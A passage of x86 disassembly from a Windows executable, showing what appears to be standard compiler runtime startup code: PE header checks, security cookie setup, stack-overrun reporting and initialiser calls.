  40c9d1:	jne    0x40c9dd
  40c9d3:	push   DWORD PTR [ecx+0xc]
  40c9d6:	call   DWORD PTR ds:0x413018
  40c9dc:	ret    
  40c9dd:	push   esi
  40c9de:	mov    esi,0x411fc0
  40c9e3:	mov    ds:0x411fc0,al
  40c9e8:	push   esi
  40c9e9:	push   ecx
  40c9ea:	call   DWORD PTR ds:0x4131c4
  40c9f0:	mov    eax,esi
  40c9f2:	pop    esi
  40c9f3:	ret    
  40c9f4:	int3   
  40c9f5:	int3   
  40c9f6:	int3   
  40c9f7:	int3   
  40c9f8:	int3   
  40c9f9:	mov    edi,edi
  40c9fb:	push   ebp
  40c9fc:	mov    ebp,esp
  40c9fe:	push   0x0
  40ca00:	push   DWORD PTR [ebp+0xc]
  40ca03:	push   DWORD PTR ds:0x413064
  40ca09:	push   DWORD PTR ds:0x403eb0
  40ca0f:	push   DWORD PTR [ebp+0x8]
  40ca12:	push   0x400000
  40ca17:	call   DWORD PTR ds:0x413068
  40ca1d:	pop    ebp
  40ca1e:	ret    0x8
  40ca21:	int3   
  40ca22:	int3   
  40ca23:	int3   
  40ca24:	int3   
  40ca25:	int3   
  40ca26:	int3   
  40ca27:	int3   
  40ca28:	int3   
  40ca29:	int3   
  40ca2a:	int3   
  40ca2b:	int3   
  40ca2c:	int3   
  40ca2d:	int3   
  40ca2e:	int3   
  40ca2f:	int3   
  40ca30:	mov    eax,0x5a4d
  40ca35:	cmp    WORD PTR ds:0x400000,ax
  40ca3c:	je     0x40ca42
  40ca3e:	xor    eax,eax
  40ca40:	jmp    0x40ca90
  40ca42:	mov    ecx,DWORD PTR ds:0x40003c
  40ca48:	cmp    DWORD PTR [ecx+0x400000],0x4550
  40ca52:	jne    0x40ca3e
  40ca54:	movzx  eax,WORD PTR [ecx+0x400018]
  40ca5b:	cmp    eax,0x10b
  40ca60:	je     0x40ca7c
  40ca62:	cmp    eax,0x20b
  40ca67:	jne    0x40ca3e
  40ca69:	xor    eax,eax
  40ca6b:	cmp    DWORD PTR [ecx+0x400084],0xe
  40ca72:	jbe    0x40ca90
  40ca74:	cmp    DWORD PTR [ecx+0x4000f8],eax
  40ca7a:	jmp    0x40ca8d
  40ca7c:	xor    eax,eax
  40ca7e:	cmp    DWORD PTR [ecx+0x400074],0xe
  40ca85:	jbe    0x40ca90
  40ca87:	cmp    DWORD PTR [ecx+0x4000e8],eax
  40ca8d:	setne  al
  40ca90:	push   0x1
  40ca92:	mov    ds:0x411898,eax
  40ca97:	call   0x40d00e
  40ca9c:	push   eax
  40ca9d:	call   DWORD PTR ds:0x413148
  40caa3:	or     DWORD PTR ds:0x411fac,0xffffffff
  40caaa:	or     DWORD PTR ds:0x411fb0,0xffffffff
  40cab1:	pop    ecx
  40cab2:	pop    ecx
  40cab3:	call   DWORD PTR ds:0x413170
  40cab9:	mov    ecx,DWORD PTR ds:0x411bc8
  40cabf:	mov    DWORD PTR [eax],ecx
  40cac1:	call   DWORD PTR ds:0x413138
  40cac7:	mov    ecx,DWORD PTR ds:0x411bbc
  40cacd:	mov    DWORD PTR [eax],ecx
  40cacf:	call   0x40d260
  40cad4:	cmp    DWORD PTR ds:0x40e000,0x0
  40cadb:	jne    0x40cae9
  40cadd:	push   0x40d260
  40cae2:	call   DWORD PTR ds:0x413174
  40cae8:	pop    ecx
  40cae9:	call   0x40d268
  40caee:	xor    eax,eax
  40caf0:	ret    
  40caf1:	int3   
  40caf2:	int3   
  40caf3:	int3   
  40caf4:	int3   
  40caf5:	int3   
  40caf6:	int3   
  40caf7:	int3   
  40caf8:	int3   
  40caf9:	int3   
  40cafa:	int3   
  40cafb:	int3   
  40cafc:	int3   
  40cafd:	int3   
  40cafe:	int3   
  40caff:	int3   
  40cb00:	mov    eax,ds:0x411bc4
  40cb05:	push   0x41189c
  40cb0a:	push   DWORD PTR ds:0x411bc0
  40cb10:	mov    ds:0x41189c,eax
  40cb15:	push   0x411890
  40cb1a:	push   0x41188c
  40cb1f:	push   0x411888
  40cb24:	call   DWORD PTR ds:0x413144
  40cb2a:	add    esp,0x14
  40cb2d:	mov    ds:0x411894,eax
  40cb32:	ret    
  40cb33:	int3   
  40cb34:	int3   
  40cb35:	int3   
  40cb36:	int3   
  40cb37:	int3   
  40cb38:	push   0x10
  40cb3a:	push   0x40d4b0
  40cb3f:	call   0x40d28c
  40cb44:	xor    ebx,ebx
  40cb46:	mov    DWORD PTR [ebp-0x4],ebx
  40cb49:	mov    eax,fs:0x18
  40cb4f:	mov    esi,DWORD PTR [eax+0x4]
  40cb52:	mov    edi,ebx
  40cb54:	mov    edx,0x411fb4
  40cb59:	mov    ecx,esi
  40cb5b:	xor    eax,eax
  40cb5d:	lock cmpxchg DWORD PTR [edx],ecx
  40cb61:	test   eax,eax
  40cb63:	je     0x40cb7d
  40cb65:	cmp    eax,esi
  40cb67:	jne    0x40cb70
  40cb69:	xor    esi,esi
  40cb6b:	inc    esi
  40cb6c:	mov    edi,esi
  40cb6e:	jmp    0x40cb80
  40cb70:	push   0x3e8
  40cb75:	call   DWORD PTR ds:0x4130d8
  40cb7b:	jmp    0x40cb54
  40cb7d:	xor    esi,esi
  40cb7f:	inc    esi
  40cb80:	cmp    DWORD PTR ds:0x411fb8,esi
  40cb86:	jne    0x40cb92
  40cb88:	push   0x1f
  40cb8a:	call   0x40d04a
  40cb8f:	pop    ecx
  40cb90:	jmp    0x40cbcc
  40cb92:	cmp    DWORD PTR ds:0x411fb8,ebx
  40cb98:	jne    0x40cbc6
  40cb9a:	mov    DWORD PTR ds:0x411fb8,esi
  40cba0:	push   0x401018
  40cba5:	push   0x40100c
  40cbaa:	call   0x40ccac
  40cbaf:	pop    ecx
  40cbb0:	pop    ecx
  40cbb1:	test   eax,eax
  40cbb3:	je     0x40cbcc
  40cbb5:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40cbbc:	mov    eax,0xff
  40cbc1:	jmp    0x40cca1
  40cbc6:	mov    DWORD PTR ds:0x411884,esi
  40cbcc:	cmp    DWORD PTR ds:0x411fb8,esi
  40cbd2:	jne    0x40cbef
  40cbd4:	push   0x401008
  40cbd9:	push   0x401000
  40cbde:	call   0x40d280
  40cbe3:	pop    ecx
  40cbe4:	pop    ecx
  40cbe5:	mov    DWORD PTR ds:0x411fb8,0x2
  40cbef:	test   edi,edi
  40cbf1:	jne    0x40cbfc
  40cbf3:	xor    eax,eax
  40cbf5:	mov    ecx,0x411fb4
  40cbfa:	xchg   DWORD PTR [ecx],eax
  40cbfc:	cmp    DWORD PTR ds:0x411fbc,0x0
  40cc03:	je     0x40cc28
  40cc05:	push   0x411fbc
  40cc0a:	call   0x40d0b0
  40cc0f:	pop    ecx
  40cc10:	test   eax,eax
  40cc12:	je     0x40cc28
  40cc14:	push   ebx
  40cc15:	push   0x2
  40cc17:	push   ebx
  40cc18:	mov    esi,DWORD PTR ds:0x411fbc
  40cc1e:	mov    ecx,esi
  40cc20:	call   DWORD PTR ds:0x4131f4
  40cc26:	call   esi
  40cc28:	push   DWORD PTR ds:0x411890
  40cc2e:	push   DWORD PTR ds:0x41188c
  40cc34:	push   DWORD PTR ds:0x411888
  40cc3a:	call   0x40888a
  40cc3f:	add    esp,0xc
  40cc42:	mov    ds:0x411880,eax
  40cc47:	cmp    DWORD PTR ds:0x411898,0x0
  40cc4e:	jne    0x40cc86
  40cc50:	push   eax
  40cc51:	call   DWORD PTR ds:0x413154
  40cc57:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc5a:	mov    eax,DWORD PTR [ecx]
  40cc5c:	mov    eax,DWORD PTR [eax]
  40cc5e:	mov    DWORD PTR [ebp-0x20],eax
  40cc61:	push   ecx
  40cc62:	push   eax
  40cc63:	call   0x40cf94
  40cc68:	pop    ecx
  40cc69:	pop    ecx
  40cc6a:	ret    
  40cc6b:	mov    esp,DWORD PTR [ebp-0x18]
  40cc6e:	mov    eax,DWORD PTR [ebp-0x20]
  40cc71:	mov    ds:0x411880,eax
  40cc76:	cmp    DWORD PTR ds:0x411898,0x0
  40cc7d:	jne    0x40cc86
  40cc7f:	push   eax
  40cc80:	call   DWORD PTR ds:0x413160
  40cc86:	cmp    DWORD PTR ds:0x411884,0x0
  40cc8d:	jne    0x40cc9a
  40cc8f:	call   DWORD PTR ds:0x413164
  40cc95:	mov    eax,ds:0x411880
  40cc9a:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40cca1:	call   0x40d2d4
  40cca6:	ret    
  40cca7:	int3   
  40cca8:	int3   
  40cca9:	int3   
  40ccaa:	int3   
  40ccab:	int3   
  40ccac:	mov    edi,edi
  40ccae:	push   ebp
  40ccaf:	mov    ebp,esp
  40ccb1:	push   ecx
  40ccb2:	mov    eax,ds:0x40e004
  40ccb7:	xor    eax,ebp
  40ccb9:	mov    DWORD PTR [ebp-0x4],eax
  40ccbc:	push   esi
  40ccbd:	mov    esi,DWORD PTR [ebp+0x8]
  40ccc0:	xor    eax,eax
  40ccc2:	cmp    esi,DWORD PTR [ebp+0xc]
  40ccc5:	jae    0x40cce5
  40ccc7:	push   edi
  40ccc8:	test   eax,eax
  40ccca:	jne    0x40cce4
  40cccc:	mov    edi,DWORD PTR [esi]
  40ccce:	test   edi,edi
  40ccd0:	je     0x40ccdc
  40ccd2:	mov    ecx,edi
  40ccd4:	call   DWORD PTR ds:0x4131f4
  40ccda:	call   edi
  40ccdc:	add    esi,0x4
  40ccdf:	cmp    esi,DWORD PTR [ebp+0xc]
  40cce2:	jb     0x40ccc8
  40cce4:	pop    edi
  40cce5:	mov    ecx,DWORD PTR [ebp-0x4]
  40cce8:	xor    ecx,ebp
  40ccea:	pop    esi
  40cceb:	call   0x40cd10
  40ccf0:	mov    esp,ebp
  40ccf2:	pop    ebp
  40ccf3:	ret    
  40ccf4:	int3   
  40ccf5:	int3   
  40ccf6:	int3   
  40ccf7:	int3   
  40ccf8:	int3   
  40ccf9:	int3   
  40ccfa:	int3   
  40ccfb:	int3   
  40ccfc:	int3   
  40ccfd:	int3   
  40ccfe:	int3   
  40ccff:	int3   
  40cd00:	call   0x40d1b8
  40cd05:	jmp    0x40cb38
  40cd0a:	int3   
  40cd0b:	int3   
  40cd0c:	int3   
  40cd0d:	int3   
  40cd0e:	int3   
  40cd0f:	int3   
  40cd10:	cmp    ecx,DWORD PTR ds:0x40e004
  40cd16:	jne    0x40cd1b
  40cd18:	ret    0x0
  40cd1b:	jmp    0x40cd54
  40cd20:	int3   
  40cd21:	int3   
  40cd22:	int3   
  40cd23:	int3   
  40cd24:	int3   
  40cd25:	mov    edi,edi
  40cd27:	push   ebp
  40cd28:	mov    ebp,esp
  40cd2a:	push   0x0
  40cd2c:	call   DWORD PTR ds:0x413070
  40cd32:	push   DWORD PTR [ebp+0x8]
  40cd35:	call   DWORD PTR ds:0x41307c
  40cd3b:	push   0xc0000409
  40cd40:	call   DWORD PTR ds:0x4130bc
  40cd46:	push   eax
  40cd47:	call   DWORD PTR ds:0x4130c0
  40cd4d:	pop    ebp
  40cd4e:	ret    
  40cd4f:	int3   
  40cd50:	int3   
  40cd51:	int3   
  40cd52:	int3   
  40cd53:	int3   
  40cd54:	mov    edi,edi
  40cd56:	push   ebp
  40cd57:	mov    ebp,esp
  40cd59:	sub    esp,0x324
  40cd5f:	mov    ds:0x4119a0,eax
  40cd64:	mov    DWORD PTR ds:0x41199c,ecx
  40cd6a:	mov    DWORD PTR ds:0x411998,edx
  40cd70:	mov    DWORD PTR ds:0x411994,ebx
  40cd76:	mov    DWORD PTR ds:0x411990,esi
  40cd7c:	mov    DWORD PTR ds:0x41198c,edi
  40cd82:	data16 mov WORD PTR ds:0x4119b8,ss
  40cd89:	data16 mov WORD PTR ds:0x4119ac,cs
  40cd90:	data16 mov WORD PTR ds:0x411988,ds
  40cd97:	data16 mov WORD PTR ds:0x411984,es
  40cd9e:	data16 mov WORD PTR ds:0x411980,fs
  40cda5:	data16 mov WORD PTR ds:0x41197c,gs
  40cdac:	pushf  
  40cdad:	pop    DWORD PTR ds:0x4119b0
  40cdb3:	mov    eax,DWORD PTR [ebp+0x0]
  40cdb6:	mov    ds:0x4119a4,eax
  40cdbb:	mov    eax,DWORD PTR [ebp+0x4]
  40cdbe:	mov    ds:0x4119a8,eax
  40cdc3:	lea    eax,[ebp+0x8]
  40cdc6:	mov    ds:0x4119b4,eax
  40cdcb:	mov    eax,DWORD PTR [ebp-0x324]
  40cdd1:	mov    DWORD PTR ds:0x4118f0,0x10001
  40cddb:	mov    eax,ds:0x4119a8
  40cde0:	mov    ds:0x4118ac,eax
  40cde5:	mov    DWORD PTR ds:0x4118a0,0xc0000409
  40cdef:	mov    DWORD PTR ds:0x4118a4,0x1
  40cdf9:	mov    DWORD PTR ds:0x4118b0,0x3
  40ce03:	push   0x4
  40ce05:	pop    eax
  40ce06:	imul   eax,eax,0x0
  40ce09:	mov    DWORD PTR [eax+0x4118b4],0x2
  40ce13:	push   0x4
  40ce15:	pop    eax
  40ce16:	shl    eax,0x0
  40ce19:	mov    ecx,DWORD PTR ds:0x40e004
  40ce1f:	mov    DWORD PTR [eax+0x4118b4],ecx
  40ce25:	push   0x4
  40ce27:	pop    eax
  40ce28:	shl    eax,1
  40ce2a:	mov    ecx,DWORD PTR ds:0x40e008
  40ce30:	mov    DWORD PTR [eax+0x4118b4],ecx
  40ce36:	push   0x4
  40ce38:	pop    eax
  40ce39:	imul   eax,eax,0x0
  40ce3c:	mov    ecx,DWORD PTR ds:0x40e004
  40ce42:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  40ce46:	push   0x4
  40ce48:	pop    eax
  40ce49:	shl    eax,0x0
  40ce4c:	mov    ecx,DWORD PTR ds:0x40e008
  40ce52:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  40ce56:	push   0x401050
  40ce5b:	call   0x40cd25
  40ce60:	mov    esp,ebp
  40ce62:	pop    ebp
  40ce63:	ret    
  40ce64:	int3   
  40ce65:	int3   
  40ce66:	int3   
  40ce67:	int3   
  40ce68:	int3   
  40ce69:	mov    edi,edi
  40ce6b:	push   ebp
  40ce6c:	mov    ebp,esp
  40ce6e:	mov    ds:0x4119a0,eax
  40ce73:	mov    DWORD PTR ds:0x41199c,ecx
  40ce79:	mov    DWORD PTR ds:0x411998,edx
  40ce7f:	mov    DWORD PTR ds:0x411994,ebx
  40ce85:	mov    DWORD PTR ds:0x411990,esi
  40ce8b:	mov    DWORD PTR ds:0x41198c,edi
  40ce91:	data16 mov WORD PTR ds:0x4119b8,ss
  40ce98:	data16 mov WORD PTR ds:0x4119ac,cs
  40ce9f:	data16 mov WORD PTR ds:0x411988,ds
  40cea6:	data16 mov WORD PTR ds:0x411984,es
  40cead:	data16 mov WORD PTR ds:0x411980,fs
  40ceb4:	data16 mov WORD PTR ds:0x41197c,gs
  40cebb:	pushf  
  40cebc:	pop    DWORD PTR ds:0x4119b0
  40cec2:	mov    DWORD PTR ds:0x4118f0,0x10001
  40cecc:	mov    eax,DWORD PTR [ebp+0x4]
  40cecf:	mov    ds:0x4119a8,eax
  40ced4:	lea    eax,[ebp+0x4]
  40ced7:	add    eax,0x4
  40ceda:	mov    ds:0x4119b4,eax
  40cedf:	mov    eax,ds:0x4119a8
  40cee4:	mov    ds:0x4118ac,eax
  40cee9:	mov    DWORD PTR ds:0x4118a0,0xc0000409
  40cef3:	mov    DWORD PTR ds:0x4118a4,0x1
  40cefd:	mov    DWORD PTR ds:0x4118b0,0x1
  40cf07:	push   0x4
  40cf09:	pop    eax
  40cf0a:	imul   eax,eax,0x0
  40cf0d:	mov    DWORD PTR [eax+0x4118b4],0x8
  40cf17:	push   0x401050
  40cf1c:	call   0x40cd25
  40cf21:	pop    ebp
  40cf22:	ret    
  40cf23:	int3   
  40cf24:	int3   
  40cf25:	int3   
  40cf26:	int3   
  40cf27:	int3   
  40cf28:	int3   
  40cf29:	int3   
  40cf2a:	int3   
  40cf2b:	int3   
  40cf2c:	int3   
  40cf2d:	int3   
  40cf2e:	int3   
  40cf2f:	int3   
  40cf30:	mov    edi,edi
  40cf32:	push   ebp
  40cf33:	mov    ebp,esp
  40cf35:	mov    eax,DWORD PTR [ebp+0x8]
  40cf38:	mov    eax,DWORD PTR [eax]
  40cf3a:	cmp    DWORD PTR [eax],0xe06d7363
  40cf40:	jne    0x40cf6d
  40cf42:	cmp    DWORD PTR [eax+0x10],0x3
  40cf46:	jne    0x40cf6d
  40cf48:	mov    eax,DWORD PTR [eax+0x14]
  40cf4b:	cmp    eax,0x19930520
  40cf50:	je     0x40cf67
  40cf52:	cmp    eax,0x19930521
  40cf57:	je     0x40cf67
  40cf59:	cmp    eax,0x19930522
  40cf5e:	je     0x40cf67
  40cf60:	cmp    eax,0x1994000
  40cf65:	jne    0x40cf6d
  40cf67:	call   DWORD PTR ds:0x41317c
  40cf6d:	xor    eax,eax
  40cf6f:	pop    ebp
  40cf70:	ret    0x4
  40cf73:	int3   
  40cf74:	int3   
  40cf75:	int3   
  40cf76:	int3   
  40cf77:	int3   
  40cf78:	int3   
  40cf79:	int3   
  40cf7a:	int3   
  40cf7b:	int3   
  40cf7c:	int3   
  40cf7d:	int3   
  40cf7e:	int3   
  40cf7f:	int3   
  40cf80:	push   0x40cf30
  40cf85:	call   DWORD PTR ds:0x413070
  40cf8b:	xor    eax,eax
  40cf8d:	ret    
  40cf8e:	int3   
  40cf8f:	int3   
  40cf90:	int3   
  40cf91:	int3   
  40cf92:	int3   
  40cf93:	int3   
  40cf94:	jmp    DWORD PTR ds:0x413118
  40cf9a:	int3   
  40cf9b:	int3   
  40cf9c:	int3   
  40cf9d:	int3   
  40cf9e:	int3   
  40cf9f:	push   0xc
  40cfa1:	push   0x40d4d0
  40cfa6:	call   0x40d328
  40cfab:	xor    ecx,ecx
  40cfad:	mov    eax,DWORD PTR [ebp+0x8]
  40cfb0:	test   eax,eax
  40cfb2:	je     0x40cfff
  40cfb4:	cmp    eax,0xffffffff
  40cfb7:	je     0x40cfff
  40cfb9:	mov    DWORD PTR [ebp-0x4],ecx
  40cfbc:	mov    edx,0x5a4d
  40cfc1:	cmp    WORD PTR [eax],dx
  40cfc4:	jne    0x40cff8
  40cfc6:	mov    edx,DWORD PTR [eax+0x3c]
  40cfc9:	test   edx,edx
  40cfcb:	js     0x40cff8
  40cfcd:	cmp    edx,0x10000000
  40cfd3:	jae    0x40cff8
  40cfd5:	add    eax,edx
  40cfd7:	mov    DWORD PTR [ebp-0x1c],eax
  40cfda:	mov    ecx,DWORD PTR [eax]
  40cfdc:	sub    ecx,0x4550
  40cfe2:	neg    ecx
  40cfe4:	sbb    ecx,ecx
  40cfe6:	not    ecx
  40cfe8:	and    ecx,eax
  40cfea:	jmp    0x40cff5
  40cfec:	xor    eax,eax
  40cfee:	inc    eax
  40cfef:	ret    
  40cff0:	mov    esp,DWORD PTR [ebp-0x18]
  40cff3:	xor    ecx,ecx
  40cff5:	mov    DWORD PTR [ebp-0x1c],ecx
  40cff8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40cfff:	mov    eax,ecx
  40d001:	call   0x40d36d
  40d006:	ret    0x4
  40d009:	int3   
  40d00a:	int3   
  40d00b:	int3   
  40d00c:	int3   
  40d00d:	int3   
  40d00e:	mov    edi,edi
  40d010:	push   ebp
  40d011:	mov    ebp,esp
  40d013:	push   0x0
  40d015:	call   DWORD PTR ds:0x413098
  40d01b:	test   eax,eax
  40d01d:	je     0x40d03f
  40d01f:	push   eax
  40d020:	call   0x40cf9f
  40d025:	test   eax,eax
  40d027:	je     0x40d03f
  40d029:	movzx  ecx,WORD PTR [eax+0x5c]
  40d02d:	push   0x2
  40d02f:	pop    eax
  40d030:	cmp    cx,ax
  40d033:	je     0x40d042
  40d035:	cmp    ecx,0x3
  40d038:	jne    0x40d03f
  40d03a:	xor    eax,eax
  40d03c:	inc    eax
  40d03d:	pop    ebp
  40d03e:	ret    
  40d03f:	mov    eax,DWORD PTR [ebp+0x8]
  40d042:	pop    ebp
  40d043:	ret    
  40d044:	int3   
  40d045:	int3   
  40d046:	int3   
  40d047:	int3   
  40d048:	int3   
  40d049:	int3   
  40d04a:	jmp    DWORD PTR ds:0x413140
  40d050:	int3   
  40d051:	int3   
  40d052:	int3   
  40d053:	int3   
  40d054:	int3   
  40d055:	int3   
  40d056:	int3   
  40d057:	int3   
  40d058:	int3   
  40d059:	int3   
  40d05a:	int3   
  40d05b:	int3   
  40d05c:	int3   
  40d05d:	int3   
  40d05e:	int3   
  40d05f:	int3   
  40d060:	mov    edi,edi
  40d062:	push   ebp
  40d063:	mov    ebp,esp
  40d065:	mov    eax,DWORD PTR [ebp+0x8]
  40d068:	xor    edx,edx
  40d06a:	push   ebx
  40d06b:	push   esi
  40d06c:	push   edi
  40d06d:	mov    ecx,DWORD PTR [eax+0x3c]
  40d070:	add    ecx,eax
  40d072:	movzx  eax,WORD PTR [ecx+0x14]
  40d076:	movzx  ebx,WORD PTR [ecx+0x6]
  40d07a:	add    eax,0x18
  40d07d:	add    eax,ecx
  40d07f:	test   ebx,ebx
  40d081:	je     0x40d09e
  40d083:	mov    edi,DWORD PTR [ebp+0xc]
  40d086:	mov    esi,DWORD PTR [eax+0xc]
  40d089:	cmp    edi,esi
  40d08b:	jb     0x40d096
  40d08d:	mov    ecx,DWORD PTR [eax+0x8]
  40d090:	add    ecx,esi
  40d092:	cmp    edi,ecx
  40d094:	jb     0x40d0a0
  40d096:	inc    edx
  40d097:	add    eax,0x28
  40d09a:	cmp    edx,ebx
  40d09c:	jb     0x40d086
  40d09e:	xor    eax,eax
  40d0a0:	pop    edi
  40d0a1:	pop    esi
  40d0a2:	pop    ebx
  40d0a3:	pop    ebp
  40d0a4:	ret    
  40d0a5:	int3   
  40d0a6:	int3   
  40d0a7:	int3   
  40d0a8:	int3   
  40d0a9:	int3   
  40d0aa:	int3   
  40d0ab:	int3   
  40d0ac:	int3   
  40d0ad:	int3   
  40d0ae:	int3   
  40d0af:	int3   
  40d0b0:	mov    edi,edi
  40d0b2:	push   ebp
  40d0b3:	mov    ebp,esp
  40d0b5:	push   0xfffffffe
  40d0b7:	push   0x40d4f0
  40d0bc:	push   0x40d2f0
  40d0c1:	mov    eax,fs:0x0
  40d0c7:	push   eax
  40d0c8:	sub    esp,0x8
  40d0cb:	push   ebx
  40d0cc:	push   esi
  40d0cd:	push   edi
  40d0ce:	mov    eax,ds:0x40e004
  40d0d3:	xor    DWORD PTR [ebp-0x8],eax
  40d0d6:	xor    eax,ebp
  40d0d8:	push   eax
  40d0d9:	lea    eax,[ebp-0x10]
  40d0dc:	mov    fs:0x0,eax
  40d0e2:	mov    DWORD PTR [ebp-0x18],esp
  40d0e5:	mov    DWORD PTR [ebp-0x4],0x0
  40d0ec:	push   0x400000
  40d0f1:	call   0x40d180
  40d0f6:	add    esp,0x4
  40d0f9:	test   eax,eax
  40d0fb:	je     0x40d151
  40d0fd:	mov    eax,DWORD PTR [ebp+0x8]
  40d100:	sub    eax,0x400000
  40d105:	push   eax
  40d106:	push   0x400000
  40d10b:	call   0x40d060
  40d110:	add    esp,0x8
  40d113:	test   eax,eax
  40d115:	je     0x40d151
  40d117:	mov    eax,DWORD PTR [eax+0x24]
  40d11a:	shr    eax,0x1f
  40d11d:	not    eax
  40d11f:	and    eax,0x1
  40d122:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40d129:	mov    ecx,DWORD PTR [ebp-0x10]
  40d12c:	mov    DWORD PTR fs:0x0,ecx
  40d133:	pop    ecx
  40d134:	pop    edi
  40d135:	pop    esi
  40d136:	pop    ebx
  40d137:	mov    esp,ebp
  40d139:	pop    ebp
  40d13a:	ret    
  40d13b:	mov    eax,DWORD PTR [ebp-0x14]
  40d13e:	mov    eax,DWORD PTR [eax]
  40d140:	xor    ecx,ecx
  40d142:	cmp    DWORD PTR [eax],0xc0000005
  40d148:	sete   cl
  40d14b:	mov    eax,ecx
  40d14d:	ret    
  40d14e:	mov    esp,DWORD PTR [ebp-0x18]
  40d151:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40d158:	xor    eax,eax
  40d15a:	mov    ecx,DWORD PTR [ebp-0x10]
  40d15d:	mov    DWORD PTR fs:0x0,ecx
  40d164:	pop    ecx
  40d165:	pop    edi
  40d166:	pop    esi
  40d167:	pop    ebx
  40d168:	mov    esp,ebp
  40d16a:	pop    ebp
  40d16b:	ret    
  40d16c:	int3   
  40d16d:	int3   
  40d16e:	int3   
  40d16f:	int3   
  40d170:	int3   
  40d171:	int3   
  40d172:	int3   
  40d173:	int3   
  40d174:	int3   
  40d175:	int3   
  40d176:	int3   
  40d177:	int3   
  40d178:	int3   
  40d179:	int3   
  40d17a:	int3   
  40d17b:	int3   
  40d17c:	int3   
  40d17d:	int3   
  40d17e:	int3   
  40d17f:	int3   
  40d180:	mov    edi,edi
  40d182:	push   ebp
  40d183:	mov    ebp,esp
  40d185:	mov    eax,DWORD PTR [ebp+0x8]
  40d188:	mov    ecx,0x5a4d
  40d18d:	cmp    WORD PTR [eax],cx
  40d190:	je     0x40d196
  40d192:	xor    eax,eax
  40d194:	pop    ebp
  40d195:	ret    
  40d196:	mov    ecx,DWORD PTR [eax+0x3c]
  40d199:	add    ecx,eax
  40d19b:	xor    eax,eax
  40d19d:	cmp    DWORD PTR [ecx],0x4550
  40d1a3:	jne    0x40d1b1
  40d1a5:	mov    edx,0x10b
  40d1aa:	cmp    WORD PTR [ecx+0x18],dx
  40d1ae:	sete   al
  40d1b1:	pop    ebp
  40d1b2:	ret    
  40d1b3:	int3   
  40d1b4:	int3   
  40d1b5:	int3   
  40d1b6:	int3   
  40d1b7:	int3   
  40d1b8:	mov    edi,edi
  40d1ba:	push   ebp
  40d1bb:	mov    ebp,esp
  40d1bd:	sub    esp,0x14
  40d1c0:	and    DWORD PTR [ebp-0xc],0x0
  40d1c4:	and    DWORD PTR [ebp-0x8],0x0
  40d1c8:	mov    eax,ds:0x40e004
  40d1cd:	push   esi
  40d1ce:	push   edi
  40d1cf:	mov    edi,0xbb40e64e
  40d1d4:	mov    esi,0xffff0000
  40d1d9:	cmp    eax,edi
  40d1db:	je     0x40d1ea
  40d1dd:	test   esi,eax
  40d1df:	je     0x40d1ea
  40d1e1:	not    eax
  40d1e3:	mov    ds:0x40e008,eax
  40d1e8:	jmp    0x40d254
  40d1ea:	lea    eax,[ebp-0xc]
  40d1ed:	push   eax
  40d1ee:	call   DWORD PTR ds:0x4130e4
  40d1f4:	mov    eax,DWORD PTR [ebp-0x8]
  40d1f7:	xor    eax,DWORD PTR [ebp-0xc]
  40d1fa:	mov    DWORD PTR [ebp-0x4],eax
  40d1fd:	call   DWORD PTR ds:0x4130b8
  40d203:	xor    DWORD PTR [ebp-0x4],eax
  40d206:	call   DWORD PTR ds:0x4130b4
  40d20c:	xor    DWORD PTR [ebp-0x4],eax
  40d20f:	call   DWORD PTR ds:0x4130e0
  40d215:	xor    eax,DWORD PTR [ebp-0x4]
  40d218:	lea    ecx,[ebp-0x4]
  40d21b:	xor    eax,ecx
  40d21d:	mov    DWORD PTR [ebp-0x4],eax
  40d220:	lea    eax,[ebp-0x14]
  40d223:	push   eax
  40d224:	call   DWORD PTR ds:0x4130c8
  40d22a:	mov    eax,DWORD PTR [ebp-0x10]
  40d22d:	xor    eax,DWORD PTR [ebp-0x14]
  40d230:	mov    ecx,DWORD PTR [ebp-0x4]
  40d233:	xor    ecx,eax
  40d235:	cmp    ecx,edi
  40d237:	je     0x40d241
  40d239:	test   DWORD PTR ds:0x40e004,esi
  40d23f:	jne    0x40d246
  40d241:	mov    ecx,0xbb40e64f
  40d246:	mov    DWORD PTR ds:0x40e004,ecx
  40d24c:	not    ecx
  40d24e:	mov    DWORD PTR ds:0x40e008,ecx
  40d254:	pop    edi
  40d255:	pop    esi
  40d256:	mov    esp,ebp
  40d258:	pop    ebp
  40d259:	ret    
  40d25a:	int3   
  40d25b:	int3   
  40d25c:	int3   
  40d25d:	int3   
  40d25e:	int3   
  40d25f:	int3   
  40d260:	xor    eax,eax
  40d262:	ret    
  40d263:	int3   
  40d264:	int3   
  40d265:	int3   
  40d266:	int3   
  40d267:	int3   
  40d268:	push   0x30000
  40d26d:	push   0x10000
  40d272:	call   DWORD PTR ds:0x413180
  40d278:	pop    ecx
  40d279:	pop    ecx
  40d27a:	ret    
  40d27b:	int3   
  40d27c:	int3   
  40d27d:	int3   
  40d27e:	int3   
  40d27f:	int3   
  40d280:	jmp    DWORD PTR ds:0x413178
  40d286:	int3   
  40d287:	int3   
  40d288:	int3   
  40d289:	int3   
  40d28a:	int3   
  40d28b:	int3   
  40d28c:	push   0x40d2f0
  40d291:	push   DWORD PTR fs:0x0
  40d298:	mov    eax,DWORD PTR [esp+0x10]
  40d29c:	mov    DWORD PTR [esp+0x10],ebp
  40d2a0:	lea    ebp,[esp+0x10]
  40d2a4:	sub    esp,eax
  40d2a6:	push   ebx
  40d2a7:	push   esi
  40d2a8:	push   edi
  40d2a9:	mov    eax,ds:0x40e004
  40d2ae:	xor    DWORD PTR [ebp-0x4],eax
  40d2b1:	xor    eax,ebp
  40d2b3:	mov    DWORD PTR [ebp-0x1c],eax
  40d2b6:	push   eax
  40d2b7:	mov    DWORD PTR [ebp-0x18],esp
  40d2ba:	push   DWORD PTR [ebp-0x8]
  40d2bd:	mov    eax,DWORD PTR [ebp-0x4]
  40d2c0:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40d2c7:	mov    DWORD PTR [ebp-0x8],eax
  40d2ca:	lea    eax,[ebp-0x10]
  40d2cd:	mov    fs:0x0,eax
  40d2d3:	ret    
  40d2d4:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d2d7:	xor    ecx,ebp
  40d2d9:	call   0x40cd10
